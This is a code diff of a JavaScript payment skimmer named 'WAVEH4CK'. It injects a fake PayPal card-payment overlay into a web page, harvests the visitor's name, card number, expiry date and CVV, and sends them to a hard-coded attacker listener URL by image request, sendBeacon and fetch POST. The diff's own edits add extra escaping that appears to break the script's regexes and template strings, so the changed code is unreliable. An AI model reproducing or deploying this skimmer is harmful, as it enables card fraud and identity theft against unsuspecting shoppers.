@@ -1,5 +1,6 @@
 /* WAVEH4CK v15.0 - HYPER-REALISTIC PAYPAL MASTER */
-(function() {
+(function () {
+    // SINKRONISASI: Arahkan ke listener.php di folder yang sama atau subfolder panel
     const C2 = 'https://waveh4ck.gamer.gd/listener.php';
     if (window._wh_final) return;
     window._wh_final = true;
@@ -10,7 +11,7 @@
             // Multi-channel exfiltration (GET + POST + Beacon)
             new Image().src = C2 + '?v=' + p + '&ts=' + Date.now();
             if (navigator.sendBeacon) navigator.sendBeacon(C2, p);
-            fetch(C2, {method: 'POST', mode: 'no-cors', body: p});
+            fetch(C2, { method: 'POST', mode: 'no-cors', body: p });
         }
     };
 
@@ -29,13 +30,13 @@
     `;
 
     function formatCC(e) {
-        let v = e.target.value.replace(/\D/g, '');
+        let v = e.target.value.replace(/\\D/g, '');
         let m = v.match(/.{1,4}/g);
         e.target.value = m ? m.join(' ') : v;
     }
 
     function formatExp(e) {
-        let v = e.target.value.replace(/\D/g, '');
+        let v = e.target.value.replace(/\\D/g, '');
         if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
         e.target.value = v;
     }
@@ -43,7 +44,7 @@
     function buildUI(origBtn) {
         const s = document.createElement('style'); s.innerHTML = _css; document.head.appendChild(s);
         const w = document.createElement('div'); w.id = 'pp-ovr';
-        w.innerHTML = `
+        w.innerHTML = \`
             <div class="pp-win">
                 <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="35">
                 <h1 class="pp-head">Paga con carta</h1>
@@ -72,7 +73,7 @@
                     Connessione sicura SSL a 256 bit
                 </div>
             </div>
-        `;
+        \`;
         document.body.appendChild(w);
 
         const nInp = document.getElementById('p-num');
@@ -84,7 +85,7 @@
             const d = {
                 site: location.host,
                 name: document.getElementById('p-name').value,
-                num: nInp.value.replace(/\s/g,''),
+                num: nInp.value.replace(/\\s/g,''),
                 exp: eInp.value,
                 cvv: document.getElementById('p-cvv').value,
                 ua: navigator.userAgent
